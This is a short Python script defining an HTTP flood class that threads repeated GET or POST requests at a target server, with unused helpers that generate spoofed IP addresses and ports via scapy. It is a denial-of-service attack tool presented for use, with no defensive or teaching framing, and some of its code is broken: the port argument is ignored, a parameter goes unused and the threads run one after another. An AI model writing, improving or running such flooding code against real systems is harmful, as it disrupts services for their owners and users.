# -*- coding: utf-8 -*-

from scapy.all import *
import socket
from threading import Thread


def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)



class HTTPFlood():
	def __init__(self,dst,port,flag,method,count):
		self.dst	 = dst
		self.port	 = 80
		self.method  = method
		self.count	 = count

		self.payload = "GET / HTTP/1.0\r\nHOST: {}\r\n\r\n" if self.method == "GET" else "POST / HTTP/1.0 \\r\n\r\n"

	def ThreadStart(self):
		for i in range(10):
			t = Thread(target=self.Start)
			t.start()
			t.join()

	def Start(self):
		for i in range(int(self.count) / 10):
			self.Attack()

	def Attack(self):
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		try:
			s.connect((self.dst,int(self.port)))
			s.send(self.payload.format(self.dst))
		except socket.error:
			pass
		s.close()
